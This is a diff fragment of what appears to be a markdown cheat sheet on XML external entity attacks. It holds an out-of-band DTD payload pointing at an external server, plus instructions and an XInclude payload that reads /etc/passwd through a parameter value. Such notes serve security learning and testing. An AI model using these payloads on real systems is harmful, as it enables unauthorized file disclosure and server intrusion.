@@ -31,7 +31,7 @@ Now paste the external DTD server link in burpsuite
 <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://external.dtd.server"> %xxe; ]>
 ```
 ### Exploiting XInclude to retrieve files
-Use &xxe; (encode & to %26) to parameter value to identify xxe via error message. Then place this payload in value to retrieve file.
+Some applications receive client-submitted data via parameter value(id=1) without xml body, embed it on the server-side into an XML document, and then parse the document. In this situation try this method. Use &xxe; (encode & to %26) to parameter value(id=&xxe;) to identify xxe via error message. Then place this payload in value to retrieve file.
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
